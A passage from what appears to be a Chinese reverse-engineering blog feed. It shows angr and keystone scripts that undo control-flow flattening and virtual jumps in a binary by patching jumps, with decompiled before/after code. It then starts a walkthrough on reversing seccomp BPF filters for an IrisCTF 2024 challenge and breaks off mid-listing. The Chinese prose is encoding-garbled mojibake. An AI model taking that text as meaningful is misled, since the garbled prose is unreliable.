program:</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        origin = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">        base = proj.loader.main_object.mapped_base</span><br><span class="line">    <span class="comment"># Fill all the irrelevant blocks with NOP</span></span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&#x27;irrelevant&#x27;</span>] + [blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]] + [blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]]:</span><br><span class="line">            origin[node.addr - base:node.addr - base + node.size] = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>] * (node.size // <span class="built_in">len</span>(ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment"># Redirect the entry block to the first relevant block</span></span><br><span class="line">        node = blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]</span><br><span class="line">        first_relevant = <span class="built_in">list</span>(new_cfg.successors([node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg.nodes() <span class="keyword">if</span> new_cfg.in_degree(node) == <span class="number">0</span>][<span class="number">0</span>]))[<span class="number">0</span>]</span><br><span class="line">        new_opcode = ks.asm(book[<span class="string">&#x27;jmp&#x27;</span>] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(first_relevant.addr), node.addr)[<span class="number">0</span>]</span><br><span class="line">        origin[node.addr - base:node.addr - base + <span class="built_in">len</span>(new_opcode)] = new_opcode</span><br><span class="line">    <span class="comment"># Rebuild the network between nodes</span></span><br><span class="line">        nodes = [node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg <span class="keyword">if</span> new_cfg.in_degree(node) <span class="keyword">and</span> new_cfg.out_degree(node)]</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">            follows = <span class="built_in">list</span>(new_cfg.successors(node))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(node.addr)&#125;</span> --&gt; <span class="subst">&#123;[<span class="built_in">hex</span>(follow.addr) <span class="keyword">for</span> follow <span class="keyword">in</span> follows]&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(follows) == <span class="number">1</span>:</span><br><span class="line">                patch_addr = all_branches[node.addr][<span class="number">2</span>]</span><br><span class="line">                new_opcode = ks.asm(book[<span class="string">&#x27;jmp&#x27;</span>] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(follows[<span class="number">0</span>].addr), patch_addr)[<span class="number">0</span>]</span><br><span class="line">                origin[patch_addr - base:patch_addr - base + <span class="built_in">len</span>(new_opcode)] = new_opcode</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                patch_addr = all_branches[node.addr][<span class="number">0</span>]</span><br><span class="line">                end_addr   = all_branches[node.addr][<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># Fill the rest of the block with NOP</span></span><br><span class="line">                origin[patch_addr - base:end_addr - base] = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>] * ((end_addr - patch_addr) // <span class="built_in">len</span>(ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>]))</span><br><span class="line">                f1, f2 = follows[<span class="number">0</span>], follows[<span class="number">1</span>]</span><br><span class="line">                op1 = book[all_branches[node.addr][<span class="number">1</span>]] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(f1.addr)</span><br><span class="line">                new_opcode1 = ks.asm(op1, patch_addr)[<span class="number">0</span>]</span><br><span class="line">                op2 = book[<span class="string">&#x27;jmp&#x27;</span>] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(f2.addr)</span><br><span class="line">                new_opcode2 = ks.asm(op2, patch_addr + <span class="built_in">len</span>(new_opcode1))[<span class="number">0</span>]</span><br><span class="line">                origin[patch_addr - base:patch_addr - base + <span class="built_in">len</span>(new_opcode1 + new_opcode2)] = new_opcode1 + new_opcode2</span><br><span class="line">                <span class="comment"># print(f&#x27;&#123;hex(patch_addr)&#125; -- &#123;hex(patch_addr + len(new_opcode1 + new_opcode2))&#125; : &#123;bytes(new_opcode1 + new_opcode2)&#125;&#x27;)</span></span><br><span class="line">        <span class="comment"># Write the patched program</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_:</span><br><span class="line">            f_.write(<span class="built_in">bytes</span>(origin))</span><br></pre></td></tr></table></figure>



<h3 id="æ€»ç»“-åç»­æ‰“ç®—"><a href="#æ€»ç»“-åç»­æ‰“ç®—" class="headerlink" title="æ€»ç»“&amp;åç»­æ‰“ç®—"></a>æ€»ç»“&amp;åç»­æ‰“ç®—</h3><p>å­¦åˆ°è™šè„±</p>
<p><del>æŠŠå…¶ä»–æ¡†æ¶çš„ä¹ŸåŠ è¿›æ¥å¢å¼ºå…¼å®¹æ€§</del>(24&#x2F;8&#x2F;20 å·²å®ç°) åé¢åº”è¯¥è¿˜ä¼šå†ç”¨angrå®ç°ä¸€ä¸‹æ™®é€šèŠ±æŒ‡ä»¤çš„æ¢­å“ˆå’Œç»•è¿‡è™šæ‹Ÿæ§åˆ¶æµ</p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ol>
<li><a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a></li>
<li><a href="https://34r7hm4n.me/0x401RevTrain-Tools/angr/10_%E5%88%A9%E7%94%A8angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">https://34r7hm4n.me/0x401RevTrain-Tools/angr/10_%E5%88%A9%E7%94%A8angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/</a></li>
<li><a href="https://izayoishiki.github.io/">https://izayoishiki.github.io</a> (è¯·è§†å¥¸ä»–)</li>
</ol>
<h2 id="ç”¨Angrå®ç°å»è™šæ‹Ÿè·³è½¬-æ§åˆ¶æµ"><a href="#ç”¨Angrå®ç°å»è™šæ‹Ÿè·³è½¬-æ§åˆ¶æµ" class="headerlink" title="ç”¨Angrå®ç°å»è™šæ‹Ÿè·³è½¬ &#x2F; æ§åˆ¶æµ"></a>ç”¨Angrå®ç°å»è™šæ‹Ÿè·³è½¬ &#x2F; æ§åˆ¶æµ</h2><p>å®é™…ä¸Šè™šæ‹Ÿè·³è½¬æ¯”è™šæ‹Ÿæ§åˆ¶æµè¦å®¹æ˜“å»é™¤ å› ä¸ºIDAåœ¨ç¡¬ç¼–ç ä¸­é—´æ•°çš„å‰æä¸‹IDAå¯ä»¥ç›´æ¥è®¡ç®—å‡ºæœ€ç»ˆè·³è½¬çš„ç»“æœ ä¾‹å¦‚:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F11%2F20240911-145913.png" alt="image-20240911145906286"></p>
<p>ä½†æ˜¯ä½¿ç”¨Angræ¥å»é™¤è™šæ‹Ÿè·³è½¬ &#x2F; æ§åˆ¶æµå¯ä»¥ä¸ç”¨è€ƒè™‘é‚£ä¹ˆå¤š åªéœ€è¦å½“ä½œå¼±åŒ–çš„æ§åˆ¶æµå¹³å¦åŒ–å¤„ç†å°±è¡Œ ç›´æ¥æ‰¾åˆ°è™šæ‹Ÿè·³è½¬çš„ç‰¹å¾ç»“æ„:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F11%2F20240911-151216.png" alt="image-20240911151216660"></p>
<p>æ®æ­¤ç¡®å®šè¦å¼€å§‹ç¬¦å·æ‰§è¡Œçš„ä½ç½® è™šæ‹Ÿè·³è½¬ç›®æ ‡çš„è®¡ç®—å’ŒåŸç¨‹åºæ§åˆ¶æµæ˜¯å®Œå…¨æ²¡æœ‰å…³ç³»çš„ å¯ä»¥ç›´æ¥ä»ç‰¹å¾ç»“æ„çš„å¤´å¼€å§‹ç¬¦å·æ‰§è¡Œ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proj = angr.Project(<span class="string">&#x27;fix2.so&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">ks = KSS[proj.arch.name]</span><br><span class="line">bias = -<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">func_block = proj.factory.block(addr=start, size=end-start+<span class="number">1</span>)</span><br><span class="line">to_patch = []</span><br><span class="line"><span class="keyword">for</span> ins <span class="keyword">in</span> func_block.capstone.insns:</span><br><span class="line">    <span class="keyword">if</span> ins.insn.mnemonic == <span class="string">&#x27;bl&#x27;</span>:</span><br><span class="line">        proj.hook(<span class="built_in">int</span>(ins.op_str[<span class="number">3</span>:], <span class="number">16</span>), angr.SIM_PROCEDURES[<span class="string">&quot;stubs&quot;</span>][<span class="string">&quot;ReturnUnconstrained&quot;</span>](), replace=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins.insn.op_str.startswith(<span class="string">&#x27;pc&#x27;</span>):</span><br><span class="line">        to_patch.append(ins.address)</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›è¡Œè®°å½•è·³è½¬åçš„åœ°å€è¿›è¡Œpatchå³å¯:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch_addr = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> to_patch:</span><br><span class="line">    state = proj.factory.blank_state(addr = addr + bias, remove_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    <span class="keyword">while</span> simgr.active[<span class="number">0</span>].addr != addr:</span><br><span class="line">        simgr.step(num_inst=<span class="number">1</span>)</span><br><span class="line">    simgr.step(num_inst=<span class="number">1</span>)</span><br><span class="line">    to_jmp = simgr.active[<span class="number">0</span>].addr</span><br><span class="line">    patch_addr[addr] = to_jmp</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;fix.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    base = <span class="number">0x400001</span></span><br><span class="line">    NOP = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> addr, jmp <span class="keyword">in</span> patch_addr.items():</span><br><span class="line">        data[addr - base + bias:addr - base] = NOP * (<span class="built_in">abs</span>(bias) // <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Fill <span class="subst">&#123;<span class="built_in">hex</span>(addr - base + bias)&#125;</span> to <span class="subst">&#123;<span class="built_in">hex</span>(addr - base)&#125;</span> with NOP(<span class="subst">&#123;<span class="built_in">abs</span>(bias) // <span class="number">2</span>&#125;</span>)&#x27;</span>)</span><br><span class="line">        opcode = ks.asm(<span class="string">f&#x27;b <span class="subst">&#123;<span class="built_in">hex</span>(jmp)&#125;</span>&#x27;</span>, addr + bias)[<span class="number">0</span>]</span><br><span class="line">        data[addr - base + bias:addr - base + bias + <span class="built_in">len</span>(opcode)] = opcode</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Patched <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(jmp)&#125;</span>&#x27;</span>)</span><br><span class="line">    fix_so = <span class="built_in">open</span>(<span class="string">&#x27;fix.so&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    fix_so.write(data)</span><br><span class="line">    fix_so.close()</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´ä»£ç :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, logging</span><br><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> ks</span><br><span class="line"><span class="keyword">import</span> capstone <span class="keyword">as</span> cs</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr&#x27;</span>).setLevel(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">start, end = <span class="number">0x401700</span>, <span class="number">0x40290C</span></span><br><span class="line">KSS = &#123;<span class="string">&#x27;AMD64&#x27;</span> : ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64), <span class="string">&#x27;ARMEL&#x27;</span> : ks.Ks(ks.KS_ARCH_ARM, ks.KS_MODE_THUMB), <span class="string">&#x27;X86&#x27;</span> : ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)&#125;</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;fix2.so&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">ks = KSS[proj.arch.name]</span><br><span class="line">bias = -<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">func_block = proj.factory.block(addr=start, size=end-start+<span class="number">1</span>)</span><br><span class="line">to_patch = []</span><br><span class="line"><span class="keyword">for</span> ins <span class="keyword">in</span> func_block.capstone.insns:</span><br><span class="line">    <span class="keyword">if</span> ins.insn.mnemonic == <span class="string">&#x27;bl&#x27;</span>:</span><br><span class="line">        proj.hook(<span class="built_in">int</span>(ins.op_str[<span class="number">3</span>:], <span class="number">16</span>), angr.SIM_PROCEDURES[<span class="string">&quot;stubs&quot;</span>][<span class="string">&quot;ReturnUnconstrained&quot;</span>](), replace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># print(f&#x27;Hooked &#123;hex(int(ins.op_str[3:], 16))&#125;&#x27;)</span></span><br><span class="line">    <span class="keyword">elif</span> ins.insn.op_str.startswith(<span class="string">&#x27;pc&#x27;</span>):</span><br><span class="line">        to_patch.append(ins.address)</span><br><span class="line">        <span class="comment"># print(f&#x27;Virtual jmp at: &#123;hex(ins.address)&#125;&#x27;)</span></span><br><span class="line">patch_addr = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> to_patch:</span><br><span class="line">    state = proj.factory.blank_state(addr = addr + bias, remove_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    <span class="keyword">while</span> simgr.active[<span class="number">0</span>].addr != addr:</span><br><span class="line">        simgr.step(num_inst=<span class="number">1</span>)</span><br><span class="line">    simgr.step(num_inst=<span class="number">1</span>)</span><br><span class="line">    to_jmp = simgr.active[<span class="number">0</span>].addr</span><br><span class="line">    patch_addr[addr] = to_jmp</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;fix.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    base = <span class="number">0x400001</span></span><br><span class="line">    NOP = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> addr, jmp <span class="keyword">in</span> patch_addr.items():</span><br><span class="line">        data[addr - base + bias:addr - base] = NOP * (<span class="built_in">abs</span>(bias) // <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Fill <span class="subst">&#123;<span class="built_in">hex</span>(addr - base + bias)&#125;</span> to <span class="subst">&#123;<span class="built_in">hex</span>(addr - base)&#125;</span> with NOP(<span class="subst">&#123;<span class="built_in">abs</span>(bias) // <span class="number">2</span>&#125;</span>)&#x27;</span>)</span><br><span class="line">        opcode = ks.asm(<span class="string">f&#x27;b <span class="subst">&#123;<span class="built_in">hex</span>(jmp)&#125;</span>&#x27;</span>, addr + bias)[<span class="number">0</span>]</span><br><span class="line">        data[addr - base + bias:addr - base + bias + <span class="built_in">len</span>(opcode)] = opcode</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Patched <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(jmp)&#125;</span>&#x27;</span>)</span><br><span class="line">    fix_so = <span class="built_in">open</span>(<span class="string">&#x27;fix.so&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    fix_so.write(data)</span><br><span class="line">    fix_so.close()</span><br></pre></td></tr></table></figure>



<p>ä¿®å¤å‰å:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_1700</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+8h] [bp-E8h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [sp+Ch] [bp-E4h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+10h] [bp-E0h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+14h] [bp-DCh]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [sp+1Ch] [bp-D4h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+28h] [bp-C8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = &amp;v7;</span><br><span class="line">  v3 = a3;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v8 = <span class="number">1066412143</span>;</span><br><span class="line">  __asm &#123; MOV             PC, R0; loc_174C &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1700</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="type">int</span> v93; <span class="comment">// [sp+DCh] [bp-14h]</span></span><br><span class="line">  _BYTE *v94; <span class="comment">// [sp+E0h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v48 = &amp;v52;</span><br><span class="line">  v47 = a3;</span><br><span class="line">  v49 = a2;</span><br><span class="line">  v50 = a1;</span><br><span class="line">  v54 = <span class="number">1066412143</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _stack_chk_guard;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Angr</tag>
      </tags>
  </entry>
  <entry>
    <title>BPFé€†å‘</title>
    <url>/2025/01/08/BPF%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<h2 id="BPFç®€ä»‹"><a href="#BPFç®€ä»‹" class="headerlink" title="BPFç®€ä»‹"></a>BPFç®€ä»‹</h2><p><a href="https://docs.kernel.org/translations/zh_CN/userspace-api/seccomp_filter.html">BPF(Berkeley Packet Filter)</a>æ˜¯ä¸€ä¸ªåœ¨Linuxå†…æ ¸è¿è¡Œçš„å®‰å…¨è®¡ç®—ç³»ç»Ÿ å¯ä»¥ç®€å•ç†è§£ä¸ºä¸€ä¸ªä¸“é—¨ä¸ºäº†è®¡ç®—è¿‡æ»¤è§„åˆ™çš„è™šæ‹Ÿæœº é€šå¸¸é…åˆ<code>prctl()</code> æˆ– <code>seccomp()</code>è¿›è¡Œå¯¹ç³»ç»Ÿè°ƒç”¨çš„é™åˆ¶ æœ‰ä¸¤ä¸ªä¸»è¦32ä½å¯„å­˜å™¨:</p>
<p><code>A</code>(ç´¯åŠ å™¨, Accumulator)ï¼šå­˜å‚¨ä¸»è¦æ“ä½œæ•°æ®</p>
<p><code>X</code>(ç´¢å¼•å¯„å­˜å™¨, Index Register)ï¼šé€šå¸¸ç”¨äºç´¢å¼•è®¡ç®—æˆ–ä¸´æ—¶å­˜å‚¨æ•°æ®</p>
<p>ä»¥åŠ16ä¸ª32ä½å†…å­˜å•å…ƒ<code>mem[idx]</code></p>
<p>æ”¯æŒå¸¸è§çš„æ•°å€¼å’Œä½è¿ç®— åœ¨ä½¿ç”¨seccompæˆ–prctlæ·»åŠ äº†BPFè¿‡æ»¤å™¨å æ¯æ¬¡è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶éƒ½ä¼šå…ˆå¯¹ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨å·<code>sys_number</code> ç³»ç»ŸABI<code>arch</code> ä»¥åŠä¼ å…¥çš„å‚æ•°è¿›è¡Œå®‰å…¨è®¡ç®—ç„¶ååˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿè°ƒç”¨</p>
<span id="more"></span>

<h2 id="BPFçš„ä½¿ç”¨"><a href="#BPFçš„ä½¿ç”¨" class="headerlink" title="BPFçš„ä½¿ç”¨"></a>BPFçš„ä½¿ç”¨</h2><p>å¦‚ä¸Šæ‰€è¯´ BPFé€šå¸¸æ˜¯ç”¨æ¥è¿›è¡Œå¯¹ç³»ç»Ÿè°ƒç”¨çš„è¿‡æ»¤çš„ ä½†æ˜¯ç”±äºå…¶å†…éƒ¨è™šæ‹Ÿæœºçš„åŠŸèƒ½çš„å¼ºå¤§ ä¹Ÿå¯ä»¥ç”¨æ¥éšè—æŸäº›é‡è¦è®¡ç®—è¿‡ç¨‹</p>
<p>å…¶ç”¨æˆ·å±‚çš„å®ç°ä¸»è¦ä¾é ä¸¤ä¸ª<a href="https://elixir.bootlin.com/linux/v6.12.6/source/include/uapi/linux/filter.h#L24">ç»“æ„ä½“</a>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>    <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16	code;		<span class="comment">/* Actual filter code */</span></span><br><span class="line">    __u8	jt;			<span class="comment">/* Jump true */</span></span><br><span class="line">    __u8	jf;			<span class="comment">/* Jump false */</span></span><br><span class="line">    __u32	k;			<span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span>                <span class="comment">/* Required for SO_ATTACH_FILTER. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>		len;	<span class="comment">/* Number of filter blocks */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> __<span class="title">user</span> *<span class="title">filter</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>sock_fprog</code>å°±æ˜¯ä½œä¸ºè¿‡æ»¤å™¨ä¼ å…¥<code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, prog)</code>æˆ–<code>seccomp(1, 0, &amp;prog)</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•° ç¬¬äºŒä¸ªæˆå‘˜<code>.filter</code>å¯ä»¥å½“ä½œè¿‡æ»¤å™¨çš„å­—èŠ‚ç  æ¯æ¡æŒ‡ä»¤é•¿åº¦éƒ½æ˜¯8 bytes è‹¥è¦æ„é€ çš„æŒ‡ä»¤ä¸æ˜¯è·³è½¬æŒ‡ä»¤ <code>.jt</code>å’Œ<code>.jf</code>é€šå¸¸éƒ½æ˜¯0 å¦‚æœè¦è‡ªå·±ç¼–å†™BPFè¿‡æ»¤å™¨é€šå¸¸ä½¿ç”¨<code>BPF_STMT(code, k)</code>å’Œ<code>BPF_JUMP(code, k, jt, jf)</code>ä¸¤ä¸ªå®æ¥åˆ†åˆ«æ„é€ è¿ç®—å’Œè·³è½¬æŒ‡ä»¤ åœ¨<a href="https://elixir.bootlin.com/linux/v6.12.6/source/include/uapi/linux/bpf_common.h#L7">è¿™é‡Œ</a>æŸ¥è¯¢æŒ‡ä»¤å¯¹åº”çš„å­—èŠ‚ç </p>
<h2 id="BPFé€†å‘"><a href="#BPFé€†å‘" class="headerlink" title="BPFé€†å‘"></a>BPFé€†å‘</h2><p>ç”±äºBPFæŒ‡ä»¤é•¿åº¦å›ºå®š æ“ä½œç ç§ç±»å°‘ å¯ä»¥è‡ªå·±å†™è„šæœ¬æ¥åæ±‡ç¼–BPFçš„å†…å®¹ è¿™é‡Œä½¿ç”¨<a href="https://github.com/david942j/seccomp-tools">seccomp tools</a>æ¥è¿›è¡Œåæ±‡ç¼– å¯ä»¥ä½¿ç”¨<code>dump</code>é€‰é¡¹æ¥è‡ªåŠ¨æ£€æµ‹ç¨‹åºä¸­çš„BPFè¿‡æ»¤å™¨å¹¶åæ±‡ç¼– ç¼ºç‚¹æ˜¯å¦‚æœåŠ è½½äº†å¤šä¸ªè¿‡æ»¤å™¨åªä¼šæ£€æµ‹å‡ºä¸€ä¸ª</p>
<p>ä¸‹é¢ç»™å‡ºä¸€ä¸ªBPFé€†å‘çš„ä¾‹å­</p>
<h3 id="IrisCTF-2024-Secure-Computing"><a href="#IrisCTF-2024-Secure-Computing" class="headerlink" title="[IrisCTF 2024] Secure Computing"></a>[IrisCTF 2024] Secure Computing</h3><p>çŸ¥é“æ˜¯BPFè¿‡æ»¤å™¨ç›¸å…³çš„é¢˜å…ˆåœ¨local typeå®šä¹‰ä¸€ä¸‹ä¸Šè¿°çš„ä¸¤ä¸ªç»“æ„ä½“æ–¹ä¾¿é€†å‘:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F01%2F08%2F20250108-230001.png" alt="image-20250108225954417"></p>
<p>ç¨‹åºåœ¨<code>.init_array</code>æ®µçš„å…¨å±€æ„é€ å‡½æ•°ä¸­æ·»åŠ äº†8ä¸ªfilter:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">init_</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">v1</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  sock_fprog v3; <span class="comment">// [rsp+0h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptrace(PTRACE_TRACEME, <span class="number">0LL</span>);</span><br><span class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  prctl(<span class="number">0x26</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3.len = (<span class="type">unsigned</span> __int16)(&amp;len)[v0];</span><br><span class="line">    v1 = (&amp;BPF_Filter)[v0++];</span><br><span class="line">    v3.filter = v1;</span><br><span class="line">    syscall(<span class="number">0x13D</span>LL, <span class="number">1LL</span>, <span class="number">0LL</span>, &amp;v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != <span class="number">8</span> );</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é•¿åº¦éƒ½æ˜¯0xED3:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F01%2F08%2F20250108-230301.png" alt="image-20250108230301280"></p>
<p>ç„¶ååœ¨ä¸»å‡½æ•°å¯¹ç³»ç»Ÿè°ƒç”¨å·0x1337è¿›è¡Œäº†è°ƒç”¨ å°†è¾“å…¥çš„flagå†…å®¹åˆ†æˆ6ä¸ªQWORDä¼ å…¥ä½œä¸ºå‚æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD v4[<span class="number">7</span>]; <span class="comment">// [rsp+0h] [rbp-58h] BYREF</span></span><br><span class="line">  __int16 v5; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Guess: &quot;</span>, a3);</span><br><span class="line">  v5 = <span 